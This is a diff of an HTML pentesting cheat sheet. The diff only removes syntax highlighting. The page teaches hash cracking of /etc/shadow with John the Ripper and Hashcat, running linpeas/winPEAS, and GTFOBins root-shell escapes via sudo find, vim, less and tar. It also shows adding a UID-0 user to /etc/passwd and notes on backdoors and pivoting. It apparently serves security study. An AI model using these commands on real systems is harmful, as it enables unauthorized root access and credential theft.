@@ -87,17 +87,6 @@
         a:hover {
             text-decoration: underline;
         }
-        /* Force all syntax highlighting spans to black */
-        .codehilite pre span,
-        .codehilite pre span.c, .codehilite pre span.c1, .codehilite pre span.ch,
-        .codehilite pre span.k, .codehilite pre span.kd, .codehilite pre span.kr,
-        .codehilite pre span.m, .codehilite pre span.mi,
-        .codehilite pre span.n, .codehilite pre span.nb, .codehilite pre span.nc, .codehilite pre span.nf, .codehilite pre span.nv,
-        .codehilite pre span.o,
-        .codehilite pre span.p, .codehilite pre span.py,
-        .codehilite pre span.s, .codehilite pre span.s1, .codehilite pre span.s2, .codehilite pre span.se,
-        .codehilite pre span.w { color: #000000 !important; }
-        pre span { color: #000000 !important; }
         @media print {
             body { margin: 0; padding: 10px; }
             pre { page-break-inside: avoid; }
@@ -132,13 +121,13 @@
 <h2 id="installation-setup">Installation &amp; Setup</h2>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># CachyOS - John:</span>
-sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>john
-john<span class="w"> </span>--version
+<pre><code># CachyOS - John:
+sudo pacman -S john
+john --version
 
-<span class="c1"># CachyOS - Hashcat:</span>
-sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>hashcat
-hashcat<span class="w"> </span>--version
+# CachyOS - Hashcat:
+sudo pacman -S hashcat
+hashcat --version
 </code></pre>
 </div>
 
@@ -149,9 +138,9 @@ hashcat<span class="w"> </span>--version
 <h3 id="1-crack-etcshadow-file">1. <strong>Crack /etc/shadow File</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># After getting root or copying shadow file:</span>
-john<span class="w"> </span>/etc/shadow
-john<span class="w"> </span>shadow.txt<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+<pre><code># After getting root or copying shadow file:
+john /etc/shadow
+john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
 </code></pre>
 </div>
 
@@ -166,41 +155,41 @@ admin:welcome2021
 <h3 id="2-identify-hash-type">2. <strong>Identify Hash Type</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>john<span class="w"> </span>--list<span class="o">=</span>formats<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>hash_type
-john<span class="w"> </span>--show<span class="w"> </span>shadow.txt<span class="w">  </span><span class="c1"># Show found passwords</span>
+<pre><code>john --list=formats | grep -i hash_type
+john --show shadow.txt  # Show found passwords
 </code></pre>
 </div>
 
 <h3 id="3-with-rules-modify-wordlist">3. <strong>With Rules (Modify Wordlist)</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>john<span class="w"> </span>shadow.txt<span class="w"> </span>--wordlist<span class="o">=</span>rockyou.txt<span class="w"> </span>--rules<span class="o">=</span>Jumbo
-<span class="c1"># Tries: password, Password, PASSWORD, pssword, p@ssword, etc.</span>
+<pre><code>john shadow.txt --wordlist=rockyou.txt --rules=Jumbo
+# Tries: password, Password, PASSWORD, pssword, p@ssword, etc.
 </code></pre>
 </div>
 
 <h3 id="4-brute-force-mode">4. <strong>Brute Force Mode</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Try all combinations (very slow):</span>
-john<span class="w"> </span>shadow.txt<span class="w"> </span>--incremental
+<pre><code># Try all combinations (very slow):
+john shadow.txt --incremental
 </code></pre>
 </div>
 
 <h3 id="5-specific-hash-type">5. <strong>Specific Hash Type</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Force hash type if not detected:</span>
-john<span class="w"> </span>hashes.txt<span class="w"> </span>--format<span class="o">=</span>md5<span class="w"> </span>--wordlist<span class="o">=</span>rockyou.txt
-john<span class="w"> </span>hashes.txt<span class="w"> </span>--format<span class="o">=</span>sha1<span class="w"> </span>--wordlist<span class="o">=</span>rockyou.txt
+<pre><code># Force hash type if not detected:
+john hashes.txt --format=md5 --wordlist=rockyou.txt
+john hashes.txt --format=sha1 --wordlist=rockyou.txt
 </code></pre>
 </div>
 
 <h3 id="6-show-results">6. <strong>Show Results</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>john<span class="w"> </span>--show<span class="w"> </span>shadow.txt
-<span class="c1"># Also shows cracked and uncracked</span>
+<pre><code>john --show shadow.txt
+# Also shows cracked and uncracked
 </code></pre>
 </div>
 
@@ -211,7 +200,7 @@ john<span class="w"> </span>hashes.txt<span class="w"> </span>--format<span clas
 <h3 id="1-crack-md5-hashes">1. <strong>Crack MD5 Hashes</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+<pre><code>hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 </code></pre>
 </div>
 
@@ -222,29 +211,29 @@ john<span class="w"> </span>hashes.txt<span class="w"> </span>--format<span clas
 <h3 id="2-crack-ntlm-windows">2. <strong>Crack NTLM (Windows)</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>rockyou.txt
-<span class="c1"># -m 1000: NTLM</span>
+<pre><code>hashcat -m 1000 -a 0 hashes.txt rockyou.txt
+# -m 1000: NTLM
 </code></pre>
 </div>
 
 <h3 id="3-crack-sha1">3. <strong>Crack SHA1</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">100</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>rockyou.txt
+<pre><code>hashcat -m 100 -a 0 hashes.txt rockyou.txt
 </code></pre>
 </div>
 
 <h3 id="4-crack-sha-512-linux">4. <strong>Crack SHA-512 (Linux)</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1800</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>rockyou.txt
+<pre><code>hashcat -m 1800 -a 0 hashes.txt rockyou.txt
 </code></pre>
 </div>
 
 <h3 id="5-show-cracked">5. <strong>Show Cracked</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>rockyou.txt<span class="w"> </span>--show
+<pre><code>hashcat -m 0 -a 0 hashes.txt rockyou.txt --show
 </code></pre>
 </div>
 
@@ -255,28 +244,28 @@ john<span class="w"> </span>hashes.txt<span class="w"> </span>--format<span clas
 <h3 id="complete-hash-cracking-workflow">Complete Hash Cracking Workflow</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Step 1: Extract hashes</span>
-cat<span class="w"> </span>/etc/shadow<span class="w">  </span><span class="c1"># If root</span>
-sqlmap<span class="w"> </span>...<span class="w"> </span>--dump<span class="w">  </span><span class="c1"># If from database</span>
+<pre><code># Step 1: Extract hashes
+cat /etc/shadow  # If root
+sqlmap ... --dump  # If from database
 
-<span class="c1"># Step 2: Save to file</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;$6$hash1&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>hashes.txt
-<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;$6$hash2&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>hashes.txt
+# Step 2: Save to file
+echo &#39;$6$hash1&#39; &gt; hashes.txt
+echo &#39;$6$hash2&#39; &gt;&gt; hashes.txt
 
-<span class="c1"># Step 3: Identify hash type</span>
-<span class="c1"># $6$ = SHA-512</span>
-<span class="c1"># $1$ = MD5</span>
-<span class="c1"># $2$ = Bcrypt</span>
+# Step 3: Identify hash type
+# $6$ = SHA-512
+# $1$ = MD5
+# $2$ = Bcrypt
 
-<span class="c1"># Step 4: Try John first (easy)</span>
-john<span class="w"> </span>hashes.txt<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+# Step 4: Try John first (easy)
+john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
-<span class="c1"># Step 5: If John doesn&#39;t find, try Hashcat with GPU:</span>
-hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1800</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+# Step 5: If John doesn&#39;t find, try Hashcat with GPU:
+hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 
-<span class="c1"># Step 6: Use found credentials</span>
-ssh<span class="w"> </span>admin@target<span class="w">  </span><span class="c1"># Use cracked password</span>
-su<span class="w"> </span>-<span class="w"> </span>user1<span class="w">  </span><span class="c1"># Switch user</span>
+# Step 6: Use found credentials
+ssh admin@target  # Use cracked password
+su - user1  # Switch user
 </code></pre>
 </div>
 
@@ -373,22 +362,22 @@ su<span class="w"> </span>-<span class="w"> </span>user1<span class="w">  </span
 <h3 id="linpeas-linux">Linpeas (Linux)</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Download:</span>
-wget<span class="w"> </span>https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+<pre><code># Download:
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 
-<span class="c1"># Make executable:</span>
-chmod<span class="w"> </span>+x<span class="w"> </span>linpeas.sh
+# Make executable:
+chmod +x linpeas.sh
 
-<span class="c1"># Transfer to target (if no direct download):</span>
-<span class="c1"># scp linpeas.sh user@target:/tmp/</span>
+# Transfer to target (if no direct download):
+# scp linpeas.sh user@target:/tmp/
 </code></pre>
 </div>
 
 <h3 id="winpeas-windows">Winpeas (Windows)</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Download .exe or .bat:</span>
-wget<span class="w"> </span>https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe
+<pre><code># Download .exe or .bat:
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe
 </code></pre>
 </div>
 
@@ -399,14 +388,14 @@ wget<span class="w"> </span>https://github.com/carlospolop/PEASS-ng/releases/lat
 <h3 id="1-run-linpeas-on-target">1. <strong>Run Linpeas on Target</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># After getting shell on target:</span>
+<pre><code># After getting shell on target:
 ./linpeas.sh
 
-<span class="c1"># Or with output file:</span>
-./linpeas.sh<span class="w"> </span>&gt;<span class="w"> </span>linpeas_output.txt
+# Or with output file:
+./linpeas.sh &gt; linpeas_output.txt
 
-<span class="c1"># Run with more checks:</span>
-./linpeas.sh<span class="w"> </span>-a<span class="w">  </span><span class="c1"># All checks</span>
+# Run with more checks:
+./linpeas.sh -a  # All checks
 </code></pre>
 </div>
 
@@ -421,12 +410,12 @@ wget<span class="w"> </span>https://github.com/carlospolop/PEASS-ng/releases/lat
 <h3 id="2-download-and-run-on-windows">2. <strong>Download and Run on Windows</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Transfer winPEAS.exe to target:</span>
-<span class="c1"># scp winPEAS.exe admin@target:C:\Temp\</span>
+<pre><code># Transfer winPEAS.exe to target:
+# scp winPEAS.exe admin@target:C:\Temp\
 
-<span class="c1"># Run:</span>
-C:<span class="se">\T</span>emp<span class="se">\w</span>inPEAS.exe
-C:<span class="se">\T</span>emp<span class="se">\w</span>inPEAS.exe<span class="w"> </span>full<span class="w">  </span><span class="c1"># More thorough</span>
+# Run:
+C:\Temp\winPEAS.exe
+C:\Temp\winPEAS.exe full  # More thorough
 </code></pre>
 </div>
 
@@ -444,16 +433,16 @@ C:<span class="se">\T</span>emp<span class="se">\w</span>inPEAS.exe<span class="
 <p>After linpeas shows findings, manually test:</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># If SUID binary found:</span>
-/usr/bin/sudo<span class="w"> </span>-l<span class="w">  </span><span class="c1"># Check sudo</span>
+<pre><code># If SUID binary found:
+/usr/bin/sudo -l  # Check sudo
 
-<span class="c1"># If kernel exploit vulnerable:</span>
-uname<span class="w"> </span>-a<span class="w">  </span><span class="c1"># Get kernel version</span>
-searchsploit<span class="w"> </span><span class="s2">&quot;Kernel 4.4.0&quot;</span><span class="w">  </span><span class="c1"># Find exploit</span>
+# If kernel exploit vulnerable:
+uname -a  # Get kernel version
+searchsploit &quot;Kernel 4.4.0&quot;  # Find exploit
 
-<span class="c1"># If weak file permission:</span>
-ls<span class="w"> </span>-la<span class="w"> </span>/etc/shadow
-cat<span class="w"> </span>/etc/shadow<span class="w">  </span><span class="c1"># If readable</span>
+# If weak file permission:
+ls -la /etc/shadow
+cat /etc/shadow  # If readable
 </code></pre>
 </div>
 
@@ -462,26 +451,26 @@ cat<span class="w"> </span>/etc/shadow<span class="w">  </span><span class="c1">
 <h2 id="real-world-example">Real-World Example</h2>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Scenario: Got user shell, need root</span>
+<pre><code># Scenario: Got user shell, need root
 
-<span class="c1"># Step 1: Transfer linpeas</span>
-scp<span class="w"> </span>linpeas.sh<span class="w"> </span>user@192.168.1.50:/tmp/
+# Step 1: Transfer linpeas
+scp linpeas.sh user@192.168.1.50:/tmp/
 
-<span class="c1"># Step 2: SSH and run linpeas</span>
-ssh<span class="w"> </span>user@192.168.1.50
-<span class="nb">cd</span><span class="w"> </span>/tmp
-chmod<span class="w"> </span>+x<span class="w"> </span>linpeas.sh
-./linpeas.sh<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>linpeas.txt
+# Step 2: SSH and run linpeas
+ssh user@192.168.1.50
+cd /tmp
+chmod +x linpeas.sh
+./linpeas.sh 2&gt;/dev/null | tee linpeas.txt
 
-<span class="c1"># Output shows (in RED):</span>
-<span class="c1"># [!] Binary /usr/bin/sudo has SUID set</span>
-<span class="c1"># [!] User can run: /usr/bin/find as SUDO without password</span>
+# Output shows (in RED):
+# [!] Binary /usr/bin/sudo has SUID set
+# [!] User can run: /usr/bin/find as SUDO without password
 
-<span class="c1"># Step 3: Exploit found vulnerability</span>
-sudo<span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span>root<span class="w"> </span>-exec<span class="w"> </span>/bin/sh<span class="w"> </span><span class="se">\;</span>
+# Step 3: Exploit found vulnerability
+sudo find / -name root -exec /bin/sh \;
 
-<span class="c1"># Now running as root!</span>
-whoami<span class="w">  </span><span class="c1"># root</span>
+# Now running as root!
+whoami  # root
 </code></pre>
 </div>
 
@@ -494,28 +483,28 @@ whoami<span class="w">  </span><span class="c1"># root</span>
 <p><strong>Finding</strong>: SUID Binary Misused (e.g., /usr/bin/find)</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># linpeas shows find has SUID</span>
-find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span>root<span class="w"> </span>-exec<span class="w"> </span>/bin/sh<span class="w"> </span><span class="se">\;</span><span class="w">  </span><span class="c1"># Get shell as root</span>
+<pre><code># linpeas shows find has SUID
+find / -name root -exec /bin/sh \;  # Get shell as root
 </code></pre>
 </div>
 
 <p><strong>Finding</strong>: Writable /etc/shadow</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Linpeas shows shadow is world-writable</span>
-<span class="c1"># You can modify it directly or add new user</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;newuser:$6$hash:0:0:root:/root:/bin/bash&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/passwd
+<pre><code># Linpeas shows shadow is world-writable
+# You can modify it directly or add new user
+echo &#39;newuser:$6$hash:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd
 </code></pre>
 </div>
 
 <p><strong>Finding</strong>: Sudo without password</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Linpeas shows:</span>
-<span class="c1"># (ALL) NOPASSWD: /usr/bin/find</span>
+<pre><code># Linpeas shows:
+# (ALL) NOPASSWD: /usr/bin/find
 
-<span class="c1"># Simply run:</span>
-sudo<span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span>root<span class="w"> </span>-exec<span class="w"> </span>/bin/sh<span class="w"> </span><span class="se">\;</span>
+# Simply run:
+sudo find / -name root -exec /bin/sh \;
 </code></pre>
 </div>
 
@@ -558,43 +547,43 @@ sudo<span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span
 <h3 id="tar">tar</h3>
 
 <div class="codehilite">
-<pre><span></span><code>tar<span class="w"> </span>-cf<span class="w"> </span>/dev/null<span class="w"> </span>/etc/shadow<span class="w"> </span>--to-stdout
-tar<span class="w"> </span>xf<span class="w"> </span>*<span class="w"> </span>--to-command<span class="o">=</span>/bin/sh<span class="w">  </span><span class="c1"># RCE</span>
+<pre><code>tar -cf /dev/null /etc/shadow --to-stdout
+tar xf * --to-command=/bin/sh  # RCE
 </code></pre>
 </div>
 
 <h3 id="vim">vim</h3>
 
 <div class="codehilite">
-<pre><span></span><code>vim<span class="w"> </span>/etc/shadow
-:!whoami<span class="w">  </span><span class="c1"># Execute commands as owner</span>
-:set<span class="w"> </span><span class="nv">shell</span><span class="o">=</span>/bin/sh
-:shell<span class="w">  </span><span class="c1"># Get shell as owner</span>
+<pre><code>vim /etc/shadow
+:!whoami  # Execute commands as owner
+:set shell=/bin/sh
+:shell  # Get shell as owner
 </code></pre>
 </div>
 
 <h3 id="less">less</h3>
 
 <div class="codehilite">
-<pre><span></span><code>less<span class="w"> </span>/etc/passwd
-!whoami<span class="w">  </span><span class="c1"># Execute command</span>
-!sh<span class="w">  </span><span class="c1"># Get shell</span>
+<pre><code>less /etc/passwd
+!whoami  # Execute command
+!sh  # Get shell
 </code></pre>
 </div>
 
 <h3 id="find">find</h3>
 
 <div class="codehilite">
-<pre><span></span><code>find<span class="w"> </span>.<span class="w"> </span>-exec<span class="w"> </span>/bin/sh<span class="w"> </span><span class="se">\;</span>
-find<span class="w"> </span>/tmp<span class="w"> </span>-name<span class="w"> </span><span class="nb">test</span><span class="w"> </span>-exec<span class="w"> </span>/bin/sh<span class="w"> </span><span class="se">\;</span>
+<pre><code>find . -exec /bin/sh \;
+find /tmp -name test -exec /bin/sh \;
 </code></pre>
 </div>
 
 <h3 id="nano">nano</h3>
 
 <div class="codehilite">
-<pre><span></span><code>nano<span class="w"> </span>/etc/shadow
-Ctrl+R<span class="w"> </span>Ctrl+X<span class="w">  </span><span class="c1"># Execute command</span>
+<pre><code>nano /etc/shadow
+Ctrl+R Ctrl+X  # Execute command
 </code></pre>
 </div>
 
@@ -605,26 +594,26 @@ Ctrl+R<span class="w"> </span>Ctrl+X<span class="w">  </span><span class="c1"># 
 <h3 id="complete-privilege-escalation-path">Complete Privilege Escalation Path</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Step 1: Get initial shell (low privilege user)</span>
-ssh<span class="w"> </span>user@target
+<pre><code># Step 1: Get initial shell (low privilege user)
+ssh user@target
 
-<span class="c1"># Step 2: Run linpeas</span>
-./linpeas.sh<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;red\|yellow&quot;</span>
+# Step 2: Run linpeas
+./linpeas.sh 2&gt;/dev/null | grep -i &quot;red\|yellow&quot;
 
-<span class="c1"># Output shows:</span>
-<span class="c1"># [RED] /usr/bin/vim is SUID</span>
+# Output shows:
+# [RED] /usr/bin/vim is SUID
 
-<span class="c1"># Step 3: Go to GTFOBins</span>
-<span class="c1"># Visit gtfobins.github.io/gtfobins/vim/</span>
+# Step 3: Go to GTFOBins
+# Visit gtfobins.github.io/gtfobins/vim/
 
-<span class="c1"># Step 4: Find SUID section</span>
-<span class="c1"># /usr/bin/vim -c &#39;:!/bin/sh&#39;</span>
+# Step 4: Find SUID section
+# /usr/bin/vim -c &#39;:!/bin/sh&#39;
 
-<span class="c1"># Step 5: Exploit!</span>
-/usr/bin/vim<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;:!/bin/sh&#39;</span>
-whoami<span class="w">  </span><span class="c1"># root</span>
+# Step 5: Exploit!
+/usr/bin/vim -c &#39;:!/bin/sh&#39;
+whoami  # root
 
-<span class="c1"># Success! Privilege escalation complete</span>
+# Success! Privilege escalation complete
 </code></pre>
 </div>
 
@@ -646,28 +635,28 @@ whoami<span class="w">  </span><span class="c1"># root</span>
 <h2 id="phase-3-complete-workflow">Phase 3 Complete Workflow</h2>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># After getting shell on target:</span>
+<pre><code># After getting shell on target:
 
-<span class="c1"># Step 1: Enumerate system</span>
-whoami<span class="p">;</span><span class="w"> </span>id<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
+# Step 1: Enumerate system
+whoami; id; uname -a
 
-<span class="c1"># Step 2: Download and run linpeas</span>
-<span class="c1"># Transfer linpeas.sh → Run it</span>
+# Step 2: Download and run linpeas
+# Transfer linpeas.sh → Run it
 
-<span class="c1"># Step 3: Review output for RED items</span>
-<span class="c1"># Focus on: SUID binaries, writable sudoers, kernel exploits</span>
+# Step 3: Review output for RED items
+# Focus on: SUID binaries, writable sudoers, kernel exploits
 
-<span class="c1"># Step 4: For each finding:</span>
-<span class="c1"># - Search GTFOBins</span>
-<span class="c1"># - Find exploit code</span>
-<span class="c1"># - Run exploit</span>
-<span class="c1"># - Check if escalated (whoami = root?)</span>
+# Step 4: For each finding:
+# - Search GTFOBins
+# - Find exploit code
+# - Run exploit
+# - Check if escalated (whoami = root?)
 
-<span class="c1"># Step 5: If escalated, maintain access</span>
-<span class="c1"># Create backdoor, new user, etc.</span>
+# Step 5: If escalated, maintain access
+# Create backdoor, new user, etc.
 
-<span class="c1"># Step 6: Post-exploitation</span>
-<span class="c1"># Dump hashes, extract data, pivot to other systems</span>
+# Step 6: Post-exploitation
+# Dump hashes, extract data, pivot to other systems
 </code></pre>
 </div>
 
